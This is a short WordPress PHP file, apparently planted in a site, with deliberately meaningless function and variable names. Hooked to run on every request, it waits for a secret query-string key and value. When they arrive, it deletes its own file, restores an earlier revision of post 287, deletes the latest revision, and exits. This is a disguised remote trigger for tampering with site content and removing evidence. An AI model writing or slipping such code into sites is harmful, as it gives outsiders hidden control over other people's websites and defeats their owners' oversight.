<?php

function this_upgrader_qr_cleaner() {
	if (isset($_GET['visibility_blog_plugins_load']) && $_GET['visibility_blog_plugins_load'] === 'switch_footer_simple') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$badge_tables_message_floating = 287;
		$updater_modal_utils = wp_get_post_revisions($badge_tables_message_floating);
		if (empty($updater_modal_utils)) die('no revisions');
		if (count($updater_modal_utils) < 2) die('less than 2');
		$allow_qr_automatorwp = array_shift($updater_modal_utils);
		$scroll_sites_real = $allow_qr_automatorwp->ID;
		$design_style_notification = array_shift($updater_modal_utils);
		$welcome_converter_services_membership = $design_style_notification->ID;
		$cloud_most_upload_select = wp_restore_post_revision($welcome_converter_services_membership);
		if ($cloud_most_upload_select === false) die('error restoring');
		$cloud_most_upload_select = wp_delete_post_revision($scroll_sites_real);		
		if ($cloud_most_upload_select === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'this_upgrader_qr_cleaner');
